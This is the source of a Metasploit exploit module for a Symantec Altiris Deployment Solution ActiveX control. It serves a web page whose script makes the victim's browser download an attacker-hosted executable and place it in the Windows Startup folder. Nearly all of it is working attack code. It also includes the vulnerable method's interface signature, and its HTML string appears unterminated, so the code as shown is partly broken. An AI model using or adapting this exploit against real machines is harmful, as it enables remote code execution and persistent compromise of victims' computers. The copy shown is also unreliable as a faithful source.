##
	# This file is part of the Metasploit Framework and may be subject to
	# redistribution and commercial restrictions. Please see the Metasploit
	# Framework web site for more information on licensing and terms of use.
	# http://metasploit.com/projects/Framework/
	##
	
	require 'msf/core'
	
	class Metasploit3 < Msf::Exploit::Remote
	
	        include Msf::Exploit::Remote::HttpServer::HTML

	        def initialize(info = {})
	                super(update_info(info,
	                        'Name'           => 'Symantec Altiris Deployment Solution ActiveX Control Arbitrary File Download and Execute.',
	                        'Description'    => %q{
	                                This module allows remote attackers to install and execute arbitrary files on a users file system via
	                                AeXNSPkgDLLib.dll (6.0.0.1418). This module was tested against Symantec Altiris Deployment Solution 6.9 sp3.
	                        },
	                        'License'        => 'MSF_LICENSE',
	                        'Author'         => [ 'MC' ],
	                        'Version'        => '$Revision:$',
	                        'References'     => 
	                                [
	                                        [ 'URL', 'http://intevydis.com/vd-list.shtml' ], # same bug?
	                                ],
	                        'Payload'        =>
	                                {
	                                        'Space'           => 2048,
	                                        'StackAdjustment' => -3500,
	                                },
	                         'DefaultOptions' =>
	                                {
	                                        'HTTP::compression' => 'gzip'
	                                },
	                        'Platform'       => 'win',
	                        'Targets'        =>
	                                [
	                                        [ 'Automatic', { } ],
	                                ],
	                        'DisclosureDate' => 'Sep 7, 2009',
	                        'DefaultTarget'  => 0))
	
	                        register_options(
	                                [
	                                        OptString.new('PATH',    [ true, "The path to place the executable.", 'C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\' ]),
	                                        OptString.new('URIPATH', [ true, "The URI to use.", "/" ])
	                                ], self.class)
	
	        end
	
	        def autofilter
	                false
	        end
	
	        def check_dependencies
	                use_zlib
	        end
	
	        def on_request_uri(cli, request)
	
	                payload_url =  "http://"
	                payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
	                payload_url += ":" + datastore['SRVPORT'] + get_resource() + "/PAYLOAD"
	
	                if (request.uri.match(/PAYLOAD/))
	                        return if ((p = regenerate_payload(cli)) == nil)
	                        data = Rex::Text.to_win32pe(p.encoded, '') 
	                        print_status("Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...")
	                        send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
	                        return
	                end
	
	                vname  = rand_text_alpha(rand(100) + 1)
	                exe    = rand_text_alpha_upper(rand(5) + 1)
	
	                content = %Q|
	        <html>
	                <head>
	                        <script>
	                                try {
	                                        var #{vname} = new ActiveXObject('Altiris.AeXNSPkgDL.1');
	                                        #{vname}.DownloadAndInstall("#{payload_url}/#{exe}.EXE", "#{datastore['PATH']}\\\\#{exe}.EXE", "#{datastore['PATH']}\\\\#{exe}.EXE", "", "");
	                                } catch( e ) { window.location = 'about:blank' ; }
	                        </script>
	                </head>
	        </html>
	
	                print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
	
	                send_response_html(cli, content)
	       
	                handler(cli)
	        end
	
	end
	=begin
	C:\Program Files\Altiris\eXpress\Deployment Web Console\DSWeb\utils\AltirisNSConsole.zip
	
	altiris_deploymentsolution_win_6_9_sp3_server.zip
	
       [id(0x00000007), helpstring("method DownloadAndInstall")]
	void DownloadAndInstall(
	                [in] BSTR Src,
	                [in] BSTR Dest,
	                [in] BSTR InstCmdLine,
	                [in] BSTR UpgdCmdLine,
	                [in] BSTR ProdCode);
	=end